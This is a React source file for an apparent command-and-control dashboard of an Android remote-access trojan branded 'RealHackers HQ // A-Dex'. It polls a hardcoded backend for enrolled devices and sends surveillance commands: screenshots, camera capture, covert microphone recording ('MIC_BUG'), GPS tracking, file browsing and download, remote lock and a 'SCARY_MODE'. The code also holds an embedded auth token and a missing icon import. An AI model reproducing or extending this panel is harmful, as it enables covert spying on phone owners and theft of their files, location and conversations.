import React, { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { 
  RefreshCcw, Settings, Activity, Terminal, Camera, MapPin, 
  Lock, Eye, List, MessageSquare, Mic, Search, ShieldAlert, Cpu, Database,
  Key as KeyIcon, Phone, Smartphone, 
  Info, Battery, X, Plus, 
  ShieldCheck, Signal, Zap, ChevronLeft, Download, FileText, Folder
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';

// --- TYPES ---

interface Device {
  id: string;
  status: string;
  model?: string;
  lastSeen?: number;
  battery?: number;
  risk?: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  location?: string;
  imei?: string;
  carrier?: string;
  metadata?: {
    permissions?: Record<string, boolean>;
    androidVersion?: string;
    appVersion?: string;
  }
}

interface LogEntry {
  id: string;
  text: string;
  type: 'info' | 'error' | 'success' | 'cmd' | 'result';
  time: string;
  icon?: any;
  data?: any;
}

type ActiveTab = 'CONSOLE' | 'MEDIA' | 'INTEL' | 'CHATS' | 'FILE_SYS';

const LOG_ICONS: Record<string, any> = {
  'SMS': MessageSquare,
  'CALL': Phone,
  'LOC': MapPin,
  'APP': Smartphone,
  'KEY': KeyIcon,
  'SYS': Cpu,
  'CMD': Terminal,
};

// --- UI COMPONENTS ---

const ModuleButton: React.FC<{ 
  icon: any, 
  label: string, 
  onClick: () => void, 
  disabled?: boolean, 
  danger?: boolean,
  color?: string
}> = ({ icon: Icon, label, onClick, disabled, danger, color }) => (
  <motion.button
    whileHover={disabled ? {} : { scale: 1.02, backgroundColor: danger ? 'rgba(231, 76, 60, 0.2)' : 'rgba(255,255,255,0.1)' }}
    whileTap={disabled ? {} : { scale: 0.98 }}
    onClick={onClick}
    disabled={disabled}
    className="btn"
    style={{
      flexDirection: 'column',
      height: '100px',
      gap: '0.8rem',
      width: '100%',
      justifyContent: 'center',
      border: danger ? '1px solid rgba(231, 76, 60, 0.3)' : '1px solid rgba(255,255,255,0.1)',
      color: danger ? '#e74c3c' : (color || '#fff'),
      opacity: disabled ? 0.3 : 1,
      fontSize: '0.6rem',
      padding: '0.5rem'
    }}
  >
    <Icon size={20} />
    <span style={{ fontWeight: 'bold', letterSpacing: '1px' }}>{label}</span>
  </motion.button>
);

const SectionTitle: React.FC<{ icon: any, label: string }> = ({ icon: Icon, label }) => (
  <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.2rem', borderBottom: '1px solid #222', paddingBottom: '0.6rem' }}>
    <Icon size={16} opacity={0.6} />
    <span style={{ fontWeight: '800', fontSize: '0.75rem', letterSpacing: '2px', color: '#888' }}>{label}</span>
  </div>
);

// --- MAIN PAGE ---

const ADexPage: React.FC = () => {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [detailDevice, setDetailDevice] = useState<Device | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [activeTab, setActiveTab] = useState<ActiveTab>('CONSOLE');
  const [showEnroll, setShowEnroll] = useState(false);

  // File Explorer State
  const [currentPath, setCurrentPath] = useState('/');
  const [fileList, setFileList] = useState<any[]>([]);

  // Settings
  const [showSettings, setShowSettings] = useState(false);
  const [backendUrl, setBackendUrl] = useState(localStorage.getItem('adex_url') || 'https://talhasss-adex-backend.hf.space');
  const [botToken, setBotToken] = useState(localStorage.getItem('adex_token') || 'talha-hq-secret-123');

  const addLog = useCallback((text: string, type: LogEntry['type'] = 'info', icon?: any, data?: any) => {
    const newLog: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      text,
      type,
      time: new Date().toLocaleTimeString([], { hour12: false }),
      icon,
      data
    };
    setLogs(prev => [newLog, ...prev].slice(0, 100));
  }, []);

  const fetchResults = useCallback(async () => {
    if (!selectedDevice) return;
    try {
      const response = await axios.get(`${backendUrl}/api/v1/devices/${selectedDevice.id}/commands/results`, {
        headers: { 'x-adex-bot-token': botToken }
      });
      const results = response.data.results || [];
      results.forEach((res: any) => {
        if (!logs.some(l => l.data?.id === res.id)) {
           addLog(`Result: ${res.command_name.toUpperCase()} -> ${res.status.toUpperCase()}`, res.status === 'success' ? 'result' : 'error', null, res);
           if (res.command_name === 'files' && res.status === 'success') {
              setFileList(res.data.files || []);
              setCurrentPath(res.data.path || '/');
           }
        }
      });
    } catch (err) {}
  }, [selectedDevice, backendUrl, botToken, logs, addLog]);

  const fetchDevices = useCallback(async () => {
    setLoading(true);
    try {
      const response = await axios.get(`${backendUrl}/api/v1/devices`, {
        params: { guildId: 'hq-guild', discordUserId: '123456789012345678' },
        headers: { 'x-adex-bot-token': botToken }
      });
      setDevices(response.data.devices || []);
    } catch (err: any) {
      // toast.error("REALTIME_SYNC_ERROR: Check server uplink.");
    } finally {
      setLoading(false);
    }
  }, [backendUrl, botToken]);

  useEffect(() => {
    document.title = "RealHackers HQ // A-Dex Mobile";
    fetchDevices();
    const interval = setInterval(() => {
      fetchDevices();
      if (selectedDevice) fetchResults();
    }, 10000);
    return () => clearInterval(interval);
  }, [fetchDevices, fetchResults, selectedDevice]);

  const sendCommand = async (commandName: string, payload: any = {}) => {
    if (!selectedDevice) return;
    addLog(`Exec: ${commandName}`, 'cmd', Terminal);
    try {
      await axios.post(`${backendUrl}/api/v1/commands`, {
        guildId: 'hq-guild', discordUserId: '123456789012345678', deviceId: selectedDevice.id, commandName, payload
      }, {
        headers: { 'x-adex-bot-token': botToken }
      });
      toast.success(`COMMAND_SENT: ${commandName.toUpperCase()}`);
    } catch (err: any) {
      toast.error(`COMMAND_FAILED: ${err.message}`);
    }
  };

  const checkPerm = (perm: string) => {
    return selectedDevice?.metadata?.permissions?.[perm] ?? false;
  };

  const filteredDevices = devices.filter(d => 
    d.id.toLowerCase().includes(searchQuery.toLowerCase()) || 
    (d.model && d.model.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  return (
    <div className="container" style={{ maxWidth: '1800px', padding: '1rem' }}>
      
      {/* Settings Modal */}
      {showSettings && (
         <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.9)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <div className="card" style={{ width: '500px', padding: '2rem', border: '1px solid #fff' }}>
               <SectionTitle icon={Settings} label="UPLINK_SETTINGS" />
               <input type="text" value={backendUrl} onChange={e => {}} placeholder="BACKEND_URL" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '1rem' }} />
               <input type="password" value={botToken} onChange={e => {}} placeholder="AUTH_TOKEN" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '2rem' }} />
               <button onClick={() => { localStorage.setItem('adex_url', backendUrl); localStorage.setItem('adex_token', botToken); setShowSettings(false); }} className="btn" style={{ width: '100%' }}>SAVE_CONFIGURATION</button>
               <button onClick={() => setShowSettings(false)} className="btn" style={{ width: '100%', marginTop: '10px', background: '#222' }}>CLOSE</button>
            </div>
         </div>
      )}

      {/* Operation Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: '380px 1fr 400px', gap: '1.5rem', height: 'calc(100vh - 120px)' }}>
        
        {/* Left: Device Selection */}
        <div className="card" style={{ padding: '1rem', display: 'flex', flexDirection: 'column' }}>
           <SectionTitle icon={Database} label="CONNECTED_CORES" />
           <div style={{ position: 'relative', marginBottom: '1.5rem' }}>
             <Search size={14} style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)', opacity: 0.3 }} />
             <input 
               type="text" placeholder="FILTER_UUID..." value={searchQuery}
               onChange={e => setSearchQuery(e.target.value)}
               style={{ background: '#000', border: '1px solid #222', padding: '0.8rem 1rem 0.8rem 2.5rem', fontSize: '0.75rem', color: '#fff', width: '100%', outline: 'none' }}
             />
          </div>
          <div style={{ flex: 1, overflowY: 'auto' }}>
             {filteredDevices.length === 0 ? <div style={{ textAlign: 'center', opacity: 0.2, marginTop: '2rem' }}>NO_CORES_CONNECTED</div> : 
               filteredDevices.map(d => (
                 <div 
                   key={d.id} onClick={() => setSelectedDevice(d)}
                   style={{ 
                      padding: '1.2rem', border: '1px solid #222', marginBottom: '1rem', cursor: 'pointer',
                      background: selectedDevice?.id === d.id ? 'rgba(231, 76, 60, 0.1)' : 'transparent',
                      borderLeft: selectedDevice?.id === d.id ? '4px solid var(--accent-color)' : '1px solid #222'
                   }}
                 >
                    <div style={{ fontSize: '0.85rem', fontWeight: '900' }}>{d.model || 'UNKNOWN_NODE'}</div>
                    <div style={{ fontSize: '0.55rem', color: '#444', fontFamily: 'monospace' }}>{d.id}</div>
                    <div style={{ marginTop: '10px', display: 'flex', justifyContent: 'space-between', fontSize: '0.6rem' }}>
                       <span style={{ color: d.status === 'online' ? '#2ecc71' : '#444' }}>● {d.status.toUpperCase()}</span>
                       <span>BAT: {d.battery}%</span>
                    </div>
                 </div>
               ))
             }
          </div>
          <button onClick={() => setShowSettings(true)} className="btn" style={{ marginTop: '1rem', width: '100%' }}><Settings size={14} /> CONSOLE_SETUP</button>
        </div>

        {/* Middle: Controller */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem', overflow: 'hidden' }}>
           {selectedDevice ? (
             <>
                <div style={{ display: 'flex', gap: '5px', background: '#0a0a0a', padding: '5px', borderRadius: '4px' }}>
                  {['CONSOLE', 'INTEL', 'MEDIA', 'CHATS', 'FILE_SYS'].map((tab: any) => (
                    <button 
                      key={tab} onClick={() => setActiveTab(tab)}
                      className={`tab-btn ${activeTab === tab ? 'active' : ''}`}
                      style={{ flex: 1, fontSize: '0.55rem' }}
                    >
                      {tab}
                    </button>
                  ))}
                </div>

                <div style={{ flex: 1, overflowY: 'auto' }}>
                   <AnimatePresence mode="wait">
                      {activeTab === 'CONSOLE' && (
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="console">
                           <SectionTitle icon={Terminal} label="SURVEILLANCE_MODULES" />
                           <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(130px, 1fr))', gap: '0.8rem', marginBottom: '2.5rem' }}>
                              <ModuleButton icon={Camera} label="SCREENSHOT" onClick={() => sendCommand('screenshot')} disabled={!checkPerm('accessibility')} />
                              <ModuleButton icon={Eye} label="CAM_SNAP" onClick={() => sendCommand('camerasnap')} disabled={!checkPerm('camera')} />
                              <ModuleButton icon={Mic} label="MIC_BUG" onClick={() => sendCommand('recordaudio')} disabled={!checkPerm('audio')} />
                              <ModuleButton icon={MapPin} label="LOCATE_GPS" onClick={() => sendCommand('location')} disabled={!checkPerm('location')} />
                              <ModuleButton icon={Smartphone} label="VIBRATE" onClick={() => sendCommand('beep')} />
                              <ModuleButton icon={Info} label="SYS_INFO" onClick={() => sendCommand('info')} />
                           </div>

                           <SectionTitle icon={Lock} label="SYSTEM_OVERRIDE" />
                           <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(130px, 1fr))', gap: '0.8rem' }}>
                              <ModuleButton icon={Lock} label="REMOTE_LOCK" onClick={() => sendCommand('lock')} disabled={!checkPerm('admin')} danger />
                              <ModuleButton icon={AlertTriangle} label="SCARY_MODE" onClick={() => sendCommand('scary_mode')} danger />
                           </div>
                        </motion.div>
                      )}

                      {activeTab === 'FILE_SYS' && (
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="fs">
                           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem', alignItems: 'center' }}>
                              <span style={{ fontSize: '0.7rem', color: '#5af' }}>PATH: {currentPath}</span>
                              <button onClick={() => sendCommand('files', { path: '/' })} className="btn" style={{ padding: '4px 10px', fontSize: '0.6rem' }}><RefreshCcw size={10} /> SCAN</button>
                           </div>
                           <div style={{ background: '#050505', border: '1px solid #111', borderRadius: '4px' }}>
                              {fileList.map(f => (
                                <div key={f.path} style={{ padding: '0.8rem', borderBottom: '1px solid #111', display: 'flex', justifyContent: 'space-between', fontSize: '0.8rem' }}>
                                   <div style={{ display: 'flex', gap: '1rem', alignItems: 'center' }}>
                                      {f.isDirectory ? <Folder size={16} color="#5af" /> : <FileText size={16} color="#444" />}
                                      <span style={{ cursor: f.isDirectory ? 'pointer' : 'default' }} onClick={() => f.isDirectory && sendCommand('files', { path: f.path })}>{f.name}</span>
                                   </div>
                                   {!f.isDirectory && <Download size={14} style={{ cursor: 'pointer', opacity: 0.5 }} onClick={() => sendCommand('download', { path: f.path })} />}
                                </div>
                              ))}
                           </div>
                        </motion.div>
                      )}
                   </AnimatePresence>
                </div>
             </>
           ) : (
             <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', opacity: 0.05 }}>
                <Terminal size={150} />
                <h2 style={{ marginTop: '2rem', letterSpacing: '15px' }}>GRID_STANDBY</h2>
             </div>
           )}
        </div>

        {/* Right: Results & Logs */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
           <div className="card" style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: '1rem' }}>
              <SectionTitle icon={Activity} label="CMD_OUTPUT_STREAM" />
              <div style={{ flex: 1, overflowY: 'auto', background: '#020202', padding: '1rem', border: '1px solid #111', fontFamily: 'JetBrains Mono', fontSize: '0.7rem' }}>
                 {logs.filter(l => l.type === 'result').map(l => (
                    <div key={l.id} style={{ marginBottom: '1.5rem', borderBottom: '1px solid #080808', paddingBottom: '1rem' }}>
                       <div style={{ color: 'var(--accent-color)', fontWeight: 'bold', marginBottom: '5px' }}>{l.data?.command_name.toUpperCase()}</div>
                       <pre style={{ whiteSpace: 'pre-wrap', color: '#ccc' }}>
                          {typeof l.data?.data === 'string' ? l.data.data : JSON.stringify(l.data?.data, null, 2)}
                       </pre>
                    </div>
                 ))}
                 {logs.filter(l => l.type === 'result').length === 0 && <div style={{ textAlign: 'center', opacity: 0.1, marginTop: '8rem' }}>WAITING_FOR_OUTPUT...</div>}
              </div>
           </div>

           <div className="card" style={{ height: '300px', display: 'flex', flexDirection: 'column', padding: '1rem' }}>
              <SectionTitle icon={Terminal} label="CORE_LOGS" />
              <div style={{ flex: 1, overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.65rem', color: '#555' }}>
                 {logs.map(log => (
                    <div key={log.id} style={{ marginBottom: '5px' }}>
                       <span style={{ opacity: 0.3 }}>[{log.time}]</span> 
                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : '#fff' }}>{log.text.toUpperCase()}</span>
                    </div>
                 ))}
              </div>
           </div>
        </div>

      </div>
    </div>
  );
};

export default ADexPage;
